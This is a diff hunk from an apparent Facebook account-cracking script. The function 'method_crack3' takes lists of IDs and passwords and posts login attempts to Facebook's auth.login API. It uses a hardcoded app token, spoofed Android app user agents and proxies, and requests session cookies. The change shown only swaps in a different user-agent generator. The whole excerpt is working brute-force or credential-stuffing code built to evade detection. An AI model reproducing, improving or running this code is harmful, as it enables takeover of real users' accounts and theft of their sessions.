@@ -255,7 +255,7 @@ def method_crack3(ids,passlist):
             build=random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
             uam3=f'Dalvik/2.1.0 (Linux; U; Android {str(random.randint(4,13))}; MIX Build/{str(build)}.{str(bld)}) [FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/'+'{density=2.0,width=720,height=1184}'+';FBLC/en_US;FBRV/85070460;FBCR/vodafone IN;FBMF/ulefone;FBBD/ulefone;FBPN/com.facebook.katana;FBDV/MIX;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
             datax={'locale': 'en_US', 'format': 'json', 'method': 'auth.login', 'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1'}
-            header={'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'b-api.facebook.com', 'User-Agent': uam3, 'priority': 'u=3,i', 'X-Fb-Http-Engine': 'Liger', 'X-Fb-Client-Ip': 'True', 'Content-Length': '2126'}
+            header={'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'b-api.facebook.com', 'User-Agent': ua(), 'priority': 'u=3,i', 'X-Fb-Http-Engine': 'Liger', 'X-Fb-Client-Ip': 'True', 'Content-Length': '2126'}
             url='https://b-api.facebook.com/method/auth.login'
             reqx=requests.post(url,data=datax,headers=header,proxies=proxs).json()
             #print(response)
